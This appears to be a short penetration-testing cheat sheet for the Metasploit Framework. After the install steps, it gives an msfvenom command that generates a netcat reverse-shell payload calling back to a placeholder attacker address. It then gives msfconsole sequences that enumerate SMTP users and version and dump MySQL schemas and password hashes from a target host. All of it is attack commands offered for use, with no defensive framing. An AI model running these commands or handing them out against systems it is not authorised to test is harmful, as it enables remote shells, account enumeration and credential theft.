# Metasploit Framework

```bash
# Install GPG key from Metaploit repository
sudo wget https://apt.metasploit.com/metasploit-framework.gpg.key \
-O /etc/apt/trusted.gpg.d/metasploit.asc

# Install Metaploit repository
echo "deb https://apt.metasploit.com xenial main" | \
sudo tee /etc/apt/sources.list.d/metasploit.list

# Install Metaploit framework
sudo apt update
sudo apt install metasploit-framework

# Generate payload for reverse shell using netcat for linux
msfvenom -p cmd/unix/reverse_netcat lhost=YOUR-IP lport=YOUR-PORT R

# Gather hostname, agent and OS from SMTP server
msfconsole
> use auxiliary/scanner/smtp/smtp_version
> options
> set RHOSTS your-target-ip
> exploit

# Try get administrator username from SMTP server
msfconsole
> use auxiliary/scanner/smtp/smtp_enum
> options
> set RHOSTS your-target-ip
> set USER_FILE /your/usernames/wordlist.txt
> exploit

# Gather version of MySQL and OS
msfconsole
> use auxiliary/admin/mysql/mysql_sql
> options
> set PASSWORD correct-password
> set RHOSTS your-target-ip
> set USERNAME root
> exploit

# Extract schema information from MySQL
msfconsole
> use auxiliary/scanner/mysql/mysql_schemadump
> options
> set PASSWORD correct-password
> set RHOSTS your-target-ip
> set USERNAME root
> exploit

# Gather MYSQL password hashdump
msfconsole
> use auxiliary/scanner/mysql/mysql_hashdump
> options
> set PASSWORD correct-password
> set RHOSTS your-target-ip
> set USERNAME root
> exploit
```
